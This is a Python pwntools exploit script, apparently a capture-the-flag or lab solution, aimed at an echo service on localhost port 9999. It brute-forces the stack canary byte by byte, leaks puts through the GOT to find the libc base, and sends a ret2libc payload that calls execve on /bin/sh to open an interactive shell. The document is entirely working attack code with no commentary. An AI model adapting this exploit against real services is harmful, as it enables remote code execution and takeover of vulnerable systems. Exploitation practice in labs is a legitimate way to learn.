from pwn import *


buffer_size = 64
buffer_offset = 12


def pad_payload(canary):
    return buffer_size * "a" + canary + buffer_offset * "a"


def get_canary():
    canary = ""
    bytes_ = [chr(i) for i in range(256)]

    for _ in range(4):
        for byte in bytes_:
            if ord(byte) == 10:
                continue
            p = connect('localhost', 9999)
            p.recvline()
            p.sendline(buffer_size * "a" + canary + byte)
            p.recvline()
            p.sendline("a")

            try:
                p.recvline()
                canary += byte
                p.close()
                break
            except:
                p.close()

    return canary


def obtain_addr_puts(canary):
    p = connect('localhost', 9999)
    p.read()
    pr = process('./echo-service')
    putsplt = pr.elf.symbols['plt.puts']
    putsgot = pr.elf.symbols['got.puts']

    payload = pad_payload(canary)

    payload += p32(putsplt)
    payload += p32(pr.elf.symbols['echo'])
    payload += p32(putsgot) * 10

    p.sendline(payload)
    p.read()
    p.sendline(payload)
    res = u32(p.read(4))

    p.close()

    return res


def exploit_string(puts_addr, canary):
    pr = process('./echo-service')
    libc_elf = ELF(pr.libc.path)
    puts_offset = libc_elf.symbols['puts']

    libc_base = puts_addr - puts_offset

    execve_offset = libc_elf.symbols['execve']
    execve = libc_base + execve_offset

    binsh_offset = list(libc_elf.search('/bin/sh'))[0]
    binsh = libc_base + binsh_offset

    payload = pad_payload(canary)
    payload += p32(execve)
    payload += p32(0)
    payload += p32(binsh)
    payload += p32(0) * 2

    return payload


if __name__ == "__main__":
    p = connect('localhost', 9999)
    canary = get_canary()
    puts = obtain_addr_puts(canary)
    expl = exploit_string(puts, canary)

    p.sendline(expl)
    p.interactive()
